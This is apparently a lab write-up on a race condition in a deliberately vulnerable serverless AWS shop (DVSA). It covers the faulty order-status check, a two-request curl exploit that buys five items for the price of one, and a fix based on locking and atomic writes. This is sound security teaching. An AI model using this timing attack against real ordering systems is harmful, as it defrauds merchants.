

# Lesson #8: Logic Vulnerabilities (Race Condition)


## Overview

This project demonstrates a **Logic Vulnerability (Race Condition)** in a serverless AWS application.
By exploiting a timing gap between the **billing process** and **order update requests**, a user can manipulate the execution order of operations.

The attack results in **paying for a single item while receiving multiple items**, violating transaction integrity without breaking authentication or input validation.

---

## Vulnerability Summary

* **Type:** Logic Vulnerability (Race Condition / TOCTOU)
* **Cause:** Improper state validation and lack of synchronization
* **Component:** `DVSA-ORDER-UPDATE` & `DVSA-ORDER-BILLING` (AWS Lambda)
* **Impact:** Underpayment and inconsistent order state

---

## Root Cause

The application validates order status using:

```python
if response["Item"]["orderStatus"] > 110:
```

This is incorrect because:

* Billing sets `orderStatus = 100`
* Condition:

  ```
  100 > 110 → False
  ```
* Update requests are still allowed during billing

Additionally:

* No locking mechanism on order state
* Parallel Lambda execution enables overlapping requests
* No atomic transaction enforcement

---

## Target Endpoint

```
https://82gs6ao5w2.execute-api.us-east-1.amazonaws.com/dvsa/order
```

---

## Exploit Overview

The attacker sends two requests almost simultaneously:

1. **Billing request** (locks price based on 1 item)
2. **Update request** (changes quantity to 5)

Because of the race condition:

* Billing processes old value (1 item)
* Update modifies order before completion

---

## Exploit Example

```bash
curl -s -X POST "$API" \
-H "Content-Type: application/json" \
-H "Authorization: <JWT_TOKEN>" \
-d "{\"action\":\"billing\",\"order-id\":\"<ORDER_ID>\",\"data\":{\"ccn\":\"4242424242424242\",\"exp\":\"12/28\",\"cvv\":\"123\"}}" &

sleep 0.1

curl -s -X POST "$API" \
-H "Content-Type: application/json" \
-H "Authorization: <JWT_TOKEN>" \
-d "{\"action\":\"update\",\"order-id\":\"<ORDER_ID>\",\"items\":{\"1009\":5}}" &
```

---

## Proof of Exploit

| Step   | Result                    |
| ------ | ------------------------- |
| Before | Items = `1`, price = `51` |
| After  | Items = `5`, price = `51` |

* Confirms race condition execution
* Confirms inconsistent transaction state
* Confirms business logic bypass

---

## Fix Implementation

### 1. Fix Status Validation

```python
# Vulnerable
if response["Item"]["orderStatus"] > 110

# Secure
if response["Item"]["orderStatus"] >= 100
```

---

### 2. Enforce State Locking

* Lock order immediately when billing starts
* Reject all updates after `orderStatus >= 100`

---

### 3. Ensure Atomic Processing

* Prevent concurrent updates during billing
* Use conditional writes or transactions in DynamoDB

---

## Verification After Fix

* Re-running exploit results in:

```json
{"status":"err","msg":"order already paid"}
```

* Item quantity remains unchanged
* Payment matches actual order

- Vulnerability successfully mitigated
- System behavior is consistent

---

## Security Analysis

### Intended Behavior

* Orders cannot be modified after billing starts
* Payment reflects actual item quantity

### Exploit Behavior

* Order updated during billing
* Payment calculated using outdated data
* User receives more items than paid for

### Fix Outcome

* Updates blocked immediately after billing
* No timing window remains
* Transaction integrity preserved

---

## Lessons Learned

* Race conditions arise from incorrect assumptions about execution order
* Serverless environments increase concurrency risks
* State must be locked before sensitive operations
* Validation alone is not enough without synchronization
* Secure design must enforce atomic transactions

---

## Tools Used

* AWS API Gateway
* AWS Lambda
* AWS DynamoDB
* Browser DevTools
* curl
* AWS CloudShell

---

## Project Structure

```
vulnerable-code/
fixed-code/
exploit/
screenshots/
```

---

## Reproduction Steps

1. Login to DVSA application
2. Add 1 item to cart
3. Proceed to billing page
4. Capture JWT token and order ID
5. Send billing and update requests simultaneously
6. Observe mismatch in items vs payment
7. Apply fix
8. Re-test → exploit fails

---

## Conclusion

This vulnerability highlights how **improper state handling and lack of synchronization** can lead to serious business logic flaws.
Even without bypassing authentication, attackers can manipulate workflows to gain financial advantage.
Proper state validation, locking, and atomic operations are essential for secure serverless application design.

---

## License

For educational purposes only.
